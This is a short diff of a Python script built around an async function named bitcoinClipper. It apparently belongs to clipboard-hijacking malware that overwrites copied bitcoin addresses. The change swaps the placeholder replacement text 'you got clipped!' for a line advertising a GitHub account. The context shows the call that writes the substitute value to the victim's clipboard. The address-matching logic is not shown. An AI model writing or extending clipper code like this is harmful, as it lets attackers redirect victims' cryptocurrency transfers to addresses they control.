@@ -29,6 +29,6 @@ async def bitcoinClipper(switch_address: str):
                     set_contents(switch_address)
 
 if __name__ == "__main__":
-    switch_address: str = "you got clipped!"
+    switch_address: str = "download this on github (github.com/notkatsu)"
     
     asyncio.run(bitcoinClipper(switch_address=switch_address))
